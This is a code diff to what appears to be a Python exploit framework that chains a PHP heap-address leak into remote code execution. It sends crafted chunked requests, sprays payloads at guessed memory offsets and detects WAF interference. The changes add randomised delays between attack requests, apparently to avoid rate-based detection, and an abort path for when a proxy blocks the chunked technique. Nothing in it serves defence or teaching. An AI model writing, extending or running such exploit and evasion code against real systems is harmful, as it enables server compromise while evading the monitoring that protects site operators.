@@ -821,8 +821,11 @@ def _parse_heap_leak(raw_cookie: bytes) -> Optional[Dict[str, Any]]:
     Returns dict with 'libphp_base', 'main_chunk_base', 'zval_ptr_dtor_addr',
     or None if parsing fails.
     """
+    MAX_COOKIE_PARSE = 65536
     if len(raw_cookie) < 64:
         return None
+    if len(raw_cookie) > MAX_COOKIE_PARSE:
+        raw_cookie = raw_cookie[:MAX_COOKIE_PARSE]
 
     from collections import Counter
 
@@ -1200,8 +1203,12 @@ def _try_chain_d_rce(
     )
     from .classifier import classify
     import urllib.parse
+    import random
 
     MAX_CHAIN_D_REQUESTS = 200
+
+    def _jitter_sleep(base: float = 0.05, spread: float = 0.15) -> None:
+        time.sleep(base + random.random() * spread)
     chain_d_reqs = 0
 
     result: Dict[str, Any] = {
@@ -1347,11 +1354,18 @@ def _try_chain_d_rce(
                 )
                 result["request_refs"].append(a1_item.id)
                 chain_d_reqs += 1
+                if a1_exchange.status == 413:
+                    result["notes"].append(
+                        "A1 got 413 — chunked TE likely stripped by WAF/proxy, aborting Chain D"
+                    )
+                    return result
                 if a1_exchange.status not in (500, 502):
                     result["notes"].append(f"A1 unexpected status: {a1_exchange.status}")
             except Exception as e:
                 result["notes"].append(f"A1 failed: {e}")
                 continue
+
+            _jitter_sleep()
 
             # ---- Try error-based leak from A1 response (Strategy 2, opportunistic) ----
             a1_body_text = _body_text(a1_exchange)
@@ -1468,6 +1482,8 @@ def _try_chain_d_rce(
                 result["notes"].append(f"A2 failed: {e}")
                 continue
 
+            _jitter_sleep()
+
             # B2: send payload
             result["notes"].append(f"B2: RCE payload via {strategy_name}")
             b2_body, b2_boundary = _build_blind_b2_body(
@@ -1556,6 +1572,8 @@ def _try_chain_d_rce(
                 chain_d_reqs += 1
             except Exception:
                 pass
+
+            _jitter_sleep()
 
             # B2: spray payload at multiple candidate positions
             # For each candidate profile, try several chunk base offsets
@@ -1646,6 +1664,8 @@ def _try_chain_d_rce(
                         chain_d_reqs += 1
                     except Exception:
                         pass
+
+                _jitter_sleep()
 
                 # Estimate main chunk relative to libphp
                 chunk_base = candidate_base - 0x200000
